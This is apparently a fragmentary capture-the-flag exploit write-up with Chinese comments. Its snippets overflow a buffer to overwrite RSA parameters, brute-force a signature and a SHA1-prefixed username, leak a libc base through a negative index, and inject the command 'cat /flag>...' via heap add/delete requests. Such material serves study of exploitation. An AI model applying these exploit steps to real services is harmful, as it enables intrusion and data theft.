...
```
payaload=b'a'*256+b'n=abf7d3abf7d3abf7&d=010001'
    response = send_custom_packet(HOST, PORT,  0x85856547, payaload)
```



```
n = int("abf7d3abf7d3abf7", 16)
d = int("010001", 16)

# 你可以调整搜索范围，例如：1到1亿（根据时间可调）
for sig in range(1, 100000000):
    m = pow(sig, d, n)
    m_bytes = m.to_bytes(8, byteorder='big')
    if m_bytes[6] == 0x21:
        if m_bytes[7] == 0xe6:
            print(f"找到签名：{sig}")
            print(f"对应的m：0x{m:016x}")
            print(f"m字节（hex）：{m_bytes.hex()}")
            break
else:
    print("未找到满足条件的签名")
```
...
    sha1_bytes = hashlib.sha1(username.encode('utf-8')).digest()

    # 检查前两个字节
    if sha1_bytes[0] == 0x23 and sha1_bytes[1] == 0xe6 and sha1_bytes[2]==0x00:
        print(f"找到符合条件的用户名: {username}")
        print(f"SHA1哈希的前两个字节: {[hex(b) for b in sha1_bytes[:2]]}")
        break
```
...
```
payload2=cookie+b'rtsp://4*!LcYcX/{"command":"show","param1":"-15","param2":"111","param3":"test"}'
    response = send_custom_packet(HOST, PORT, 0x7F687985, payload2)
    match = re.search(b"Content:s*(d+):", response)
    if match:
        number_str = match.group(1).decode()
        number = int(number_str)
        print("Extracted number:", number)
        print("Hex:", hex(number))
        libc_base=number-0x183df0
    else:
...
```
for i in range(11):
        payload2 = cookie + b'rtsp://4*!LcYcX/{"command":"add","param1":"1024","param2":"cat /flag>/home/lyyy/login.php","param3":"test"}'
        response = send_custom_packet(HOST, PORT, 0x7F687985, payload2)
    payload2 = cookie + b'rtsp://4*!LcYcX/{"command":"delete","param1":"0","param2":"11","param3":"test"}'
    response = send_custom_packet(HOST, PORT, 0x7F687985, payload2)
